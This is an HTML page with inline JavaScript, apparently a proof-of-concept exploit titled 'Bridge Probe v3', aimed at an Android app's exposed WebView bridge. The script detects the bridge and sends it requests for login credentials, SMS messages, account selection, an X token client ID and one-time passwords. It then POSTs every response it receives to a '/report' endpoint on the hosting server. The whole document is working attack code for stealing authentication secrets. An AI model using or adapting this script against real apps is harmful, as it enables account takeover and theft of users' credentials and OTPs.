<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Bridge Probe v3</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  body { font-family: monospace; background: #111; color: #0f0; padding: 10px; margin: 0; }
  .out { font-size: 13px; white-space: pre-wrap; word-break: break-all; }
  .resp { background: #000; border: 2px solid #0f0; border-radius: 8px; padding: 10px; margin: 8px 0; font-size: 21px; word-break: break-all; }
  .resp .cmd { color: #ff0; font-size: 17px; display: block; margin-bottom: 6px; }
</style>
</head>
<body>
<div class="out" id="out">PROBE v3
</div>
<div id="resps"></div>
<script>
(function () {
    var out = document.getElementById('out');
    function log(s) {
        out.textContent += '\n' + s;
        try { fetch('/report', {method: 'POST', body: String(s).slice(0, 3000)}); } catch (e) {}
    }
    log('URL: ' + location.href);
    var na = window.nativeAMAndroid;
    log('bridge: ' + (na ? 'FOUND (' + Object.keys(na).join(',') + ')' : 'NOT FOUND'));
    if (!na) return;

    window.nativeAMResponse = {
        receive: function (reqId, json) {
            var cmd = (window.__reqmap || {})[reqId] || reqId.slice(0, 18);
            var d = document.createElement('div');
            d.className = 'resp';
            d.innerHTML = '<span class="cmd">== ' + cmd + '</span>' + String(json).slice(0, 400);
            document.getElementById('resps').appendChild(d);
            log('RESP ' + cmd + ' :: ' + String(json).slice(0, 500));
        }
    };

    window.__reqmap = {};
    var seq = ['ready', 'requestLoginCredentials', 'getSms', 'chooseAccount', 'getXTokenClientId', 'getOtp'];
    seq.forEach(function (msg, i) {
        setTimeout(function () {
            var id = 'p' + i + '_' + Date.now();
            window.__reqmap[id] = msg;
            try {
                na.send(JSON.stringify({version: 1, message: msg, requestId: id, data: {}}));
                log('>>> ' + msg);
            } catch (e) { log('ERR ' + msg + ' ' + e); }
        }, 600 + i * 1200);
    });
})();
</script>
</body>
</html>
